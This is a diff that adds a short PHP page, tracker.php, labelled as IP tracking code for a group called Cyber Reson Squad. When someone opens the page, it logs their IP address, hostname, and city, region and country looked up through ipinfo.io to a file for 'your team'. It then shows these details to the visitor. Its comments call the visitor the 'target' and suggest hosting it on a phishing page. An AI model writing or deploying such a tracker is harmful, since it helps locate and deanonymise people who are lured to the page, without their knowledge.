@@ -1,0 +1,22 @@
+tracker.php
+<?php
+// IP tracking code for Cyber Reson Squad
+$ip = $_SERVER['REMOTE_ADDR'];  // Target IP address
+$timestamp = date("Y-m-d H:i:s");  // Timestamp when accessed
+$location = json_decode(file_get_contents("http://ipinfo.io/{$ip}/json"));
+$city = $location->city;
+$region = $location->region;
+$country = $location->country;
+$hostname = gethostbyaddr($ip);
+
+// Log details to a file for your team
+file_put_contents("log.txt", "IP: $ip\nTimestamp: $timestamp\nLocation: $city, $region, $country\nHostname: $hostname\n\n", FILE_APPEND);
+
+// Display message to target (could be a phishing page)
+echo "Your IP address: $ip<br>";
+echo "Location: $city, $region, $country<br>";
+echo "Timestamp: $timestamp<br>";
+
+// Optionally, show map with Google Maps API (if you want to integrate a map view)
+echo "<br><a href='https://maps.google.com/?q={$city},{$region},{$country}' target='_blank'>View on map</a>";
+?>
